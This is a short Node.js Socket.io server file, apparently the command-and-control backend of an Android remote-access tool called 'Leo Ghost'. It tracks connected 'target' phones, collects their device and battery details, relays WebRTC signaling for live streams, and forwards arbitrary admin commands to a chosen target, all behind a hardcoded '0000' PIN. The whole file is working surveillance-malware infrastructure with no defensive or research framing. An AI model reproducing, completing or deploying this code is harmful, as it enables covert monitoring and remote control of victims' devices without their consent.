const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let adminSocketId = null;
let targetData = {}; // Device details store karne ke liye

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Admin login
    socket.on('admin-join', (pin) => {
        if (pin === "0000") {
            adminSocketId = socket.id;
            socket.emit('admin-status', { success: true });
            console.log("Admin Logged In");
            sendUpdateToAdmin();
        } else {
            socket.emit('admin-status', { success: false });
        }
    });

    // Target (APK) join
    socket.on('target-join', (info) => {
        socket.join('targets_room');
        // Store battery and device info
        targetData[socket.id] = {
            id: socket.id,
            battery: info.battery || "N/A",
            device: info.device || "Android",
            status: "online"
        };
        console.log("Target Online:", socket.id);
        sendUpdateToAdmin();
    });

    // Signaling (Admin <-> Target)
      socket.on('signal', (data) => {
        io.to(data.to).emit('signal', { from: socket.id, signal: data.signal });
    });

    // Command forwarder
    socket.on('command', (data) => {
        io.to(data.targetId).emit('command', { cmd: data.cmd, adminId: socket.id });
    });

    socket.on('disconnect', () => {
        if (socket.id === adminSocketId) {
            adminSocketId = null;
        } else if (targetData[socket.id]) {
            console.log("Target Offline:", socket.id);
            // Delete from active but keep data for a while if needed
            delete targetData[socket.id];
            sendUpdateToAdmin();
        }
    });
});

function sendUpdateToAdmin() {
    if (adminSocketId) {
        const activeTargets = io.sockets.adapter.rooms.get('targets_room');
        const list = activeTargets ? Array.from(activeTargets).map(id => ({
            id: id,
            battery: targetData[id]?.battery || "N/A",
            device: targetData[id]?.device || "Android"
        })) : [];
        
        io.to(adminSocketId).emit('update-targets', list);
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Leo Ghost Server Synced`));
